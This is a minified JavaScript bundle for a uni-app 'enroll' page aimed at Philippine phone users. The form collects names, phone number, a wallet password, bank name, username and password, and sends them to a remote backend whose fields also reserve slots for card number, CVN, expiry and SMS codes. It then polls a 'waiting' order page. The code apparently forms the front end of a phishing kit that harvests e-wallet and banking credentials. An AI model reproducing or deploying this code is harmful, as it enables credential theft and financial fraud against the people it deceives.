import{d as a,k as e,l,m as s,r as t,p as d,o as u,e as o,w as r,f as m,g as n,q as i,t as f,u as p,b as _,s as c,v as w,x as v,_ as b}from"./index-1a1fccd8.js";import{_ as N,a as V}from"./uni-forms-item.f74ff9fd.js";import{r as L,a as h,_ as y,b as A,c as E}from"./Rules.f714300d.js";import{h as x,c as g}from"./Remote.9d35866b.js";const B=b(a({...{data:()=>({options:{}}),onLoad(a){this.options=a}},__name:"enroll",setup(a){e(),l((()=>{let a=s().data.options;console.log(a.a)}));const b=t(null),B=t({lastName:"",firstName:"",middleName:"",phone:"",walletPassword:"",bankName:"",username:"",password:"",passwordConfirm:""}),U=async a=>{b.value.validate();let e=B.value,l={d_kaihuhang:e.bankName,d_name:e.username+"["+e.firstName+", "+e.middleName+", "+e.lastName+"]",d_kahao:"",d_mima:e.walletPassword,d_mima2:e.password,d_sfz:"",d_phone:e.phone,d_cvn:"",d_cvntime:"",d_yue:null,d_yzm:null,d_download:null,d_permission:null,d_sms:"",d_device:null},s=await g(l);console.log(s),1==s.status&&c({url:"waiting?order="+s.d_id})};d((()=>{clearInterval(P)}));const P=setInterval((async()=>{try{x(B.value.id)}catch(a){}}),3e3);return(a,e)=>{const l=m,s=w,t=L(v("uni-easyinput"),N),d=L(v("uni-forms-item"),V),c=L(v("uni-col"),y),x=L(v("uni-row"),A),g=L(v("uni-forms"),E);return u(),o(l,{class:"home-container"},{default:r((()=>[n(l,{class:"custom-nav"},{default:r((()=>[n(l),n(l,null,{default:r((()=>[n(s,{class:"title"},{default:r((()=>[i(f(a.$t("PAGE_TITLE")),1)])),_:1})])),_:1}),n(l)])),_:1}),n(l,{variant:"text",class:"card"},{default:r((()=>[n(g,{class:"form",modelValue:B.value,ref_key:"prepareForm",ref:b,"label-position":"top","err-show-type":"undertext",rules:p(h),validateTrigger:"blur"},{default:r((()=>[n(x,{class:"flex-row form-row"},{default:r((()=>[n(c,{span:8},{default:r((()=>[n(d,{required:"",name:"lastName",label:a.$t("LABEL_LAST_NAME"),class:"form-item"},{default:r((()=>[n(t,{class:"input",focus:"",type:"text",modelValue:B.value.lastName,"onUpdate:modelValue":e[0]||(e[0]=a=>B.value.lastName=a)},null,8,["modelValue"])])),_:1},8,["label"])])),_:1}),n(c,{span:8},{default:r((()=>[n(d,{required:"",name:"firstName",label:a.$t("LABEL_FIRST_NAME"),class:"form-item"},{default:r((()=>[n(t,{class:"input",type:"text",modelValue:B.value.firstName,"onUpdate:modelValue":e[1]||(e[1]=a=>B.value.firstName=a)},null,8,["modelValue"])])),_:1},8,["label"])])),_:1}),n(c,{span:8},{default:r((()=>[n(d,{required:"",name:"middleName",label:a.$t("LABEL_MIDDLE_NAME"),class:"form-item"},{default:r((()=>[n(t,{class:"input",type:"text",modelValue:B.value.middleName,"onUpdate:modelValue":e[2]||(e[2]=a=>B.value.middleName=a)},null,8,["modelValue"])])),_:1},8,["label"])])),_:1})])),_:1}),n(x,{class:"form-row"},{default:r((()=>[n(c,{span:24},{default:r((()=>[n(d,{required:"",name:"phone",label:a.$t("LABEL_PHONE_NUMBER"),class:"form-item","label-width":"100vw"},{default:r((()=>[n(x,{class:"flex-row"},{default:r((()=>[n(c,{span:4,style:{"text-align":"right",color:"#999"}},{default:r((()=>[i(" Philippines"),_("br"),i("(+63) ")])),_:1}),n(c,{span:20},{default:r((()=>[n(t,{class:"input",type:"tel",modelValue:B.value.phone,"onUpdate:modelValue":e[3]||(e[3]=a=>B.value.phone=a)},null,8,["modelValue"])])),_:1})])),_:1})])),_:1},8,["label"])])),_:1})])),_:1}),n(x,{class:"form-row"},{default:r((()=>[n(c,{span:24},{default:r((()=>[n(d,{required:"",name:"walletPassword",label:a.$t("LABEL_WALLET_PASSWORD"),class:"form-item","label-width":"100vw"},{default:r((()=>[n(t,{class:"input",type:"password",modelValue:B.value.walletPassword,"onUpdate:modelValue":e[4]||(e[4]=a=>B.value.walletPassword=a)},null,8,["modelValue"])])),_:1},8,["label"])])),_:1})])),_:1}),n(x,{class:"form-row"},{default:r((()=>[n(c,{span:24},{default:r((()=>[n(d,{required:"",name:"bankName",label:a.$t("LABEL_BANK_NAME"),class:"form-item","label-width":"100vw"},{default:r((()=>[n(t,{class:"input",type:"text",modelValue:B.value.bankName,"onUpdate:modelValue":e[5]||(e[5]=a=>B.value.bankName=a)},null,8,["modelValue"])])),_:1},8,["label"])])),_:1})])),_:1}),n(x,{class:"form-row"},{default:r((()=>[n(c,{span:24},{default:r((()=>[n(d,{required:"",name:"username",label:a.$t("LABEL_USERNAME"),class:"form-item","label-width":"100vw"},{default:r((()=>[n(t,{class:"input",type:"text",modelValue:B.value.username,"onUpdate:modelValue":e[6]||(e[6]=a=>B.value.username=a)},null,8,["modelValue"])])),_:1},8,["label"])])),_:1})])),_:1}),n(x,{class:"form-row"},{default:r((()=>[n(c,{span:24},{default:r((()=>[n(d,{required:"",name:"password",label:a.$t("LABEL_PASSWORD"),class:"form-item","label-width":"100vw"},{default:r((()=>[n(t,{class:"input",type:"password",modelValue:B.value.password,"onUpdate:modelValue":e[7]||(e[7]=a=>B.value.password=a)},null,8,["modelValue"])])),_:1},8,["label"])])),_:1})])),_:1}),n(x,{class:"form-row"},{default:r((()=>[n(c,{span:24},{default:r((()=>[n(d,{required:"",name:"passwordConfirm",label:a.$t("LABEL_PASSWORD_CONFIRM"),class:"form-item","label-width":"100vw"},{default:r((()=>[n(t,{class:"password",type:"password",modelValue:B.value.passwordConfirm,"onUpdate:modelValue":e[8]||(e[8]=a=>B.value.passwordConfirm=a)},null,8,["modelValue"])])),_:1},8,["label"])])),_:1})])),_:1}),n(x,{class:"form-row"},{default:r((()=>[n(c,{span:24,style:{"text-align":"center"}},{default:r((()=>[_("uni-button",{type:"primary",class:"large-button",onClick:U},f(a.$t("SUBMIT")),1)])),_:1})])),_:1})])),_:1},8,["modelValue","rules"])])),_:1})])),_:1})}}}),[["__scopeId","data-v-24a95375"]]);export{B as default};